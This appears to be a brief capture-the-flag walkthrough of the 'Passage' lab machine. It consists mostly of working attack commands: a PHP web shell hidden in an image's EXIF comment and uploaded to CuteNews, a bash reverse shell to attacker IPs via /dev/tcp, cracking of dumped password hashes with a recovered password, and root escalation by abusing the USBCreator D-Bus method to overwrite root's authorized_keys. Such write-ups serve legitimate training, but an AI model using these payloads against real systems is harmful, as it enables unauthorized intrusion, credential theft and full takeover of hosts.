First we need to register a new user

user:ishallpass
pass:ishallpass

then we need to upload an shell hidden in an image

exiftool -Comment='<?php echo "<pre>";
system($_GET['cmd']); ?>' shell.png;

rename image to shell.png.php

after uploading visit http://10.10.10.206/CuteNews/uploads/

set up a listener with netcat

url encode /bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'

10.10.10.206/CuteNews/uploads/avatar_ishallpass_shell.png.php?cmd=/bin/bash+-c+'bash+-i+>+/dev/tcp/10.10.14.88/1818+0>%261'
and send it to the server with parameter id=[URL_ENCODED_PAYLOAD]


I could use my password scavenger on the /var/www/html dir


looking through the in /var/www/html/CuteNews/cdata/users 
file 09.php has some data about paul@passage.htb. 
There is a user in the machine named Paul
a password is included but seems encrypted


admin file 7a.php
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}


echo e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd | cut -f 1 -d " " > password
john --format=raw-sha256 --show password


paul password = atlanta1


inside the .ssh of paul were the ssh key to connect to nadav :)



For root we need to exploit DBus => https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/


if we upload our id_rsa.pub key to the server and use cmd below to transfer it to root's authorized_keys we can ssh in as root
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/bigra/key.pub /root/.ssh/authorized_keys true
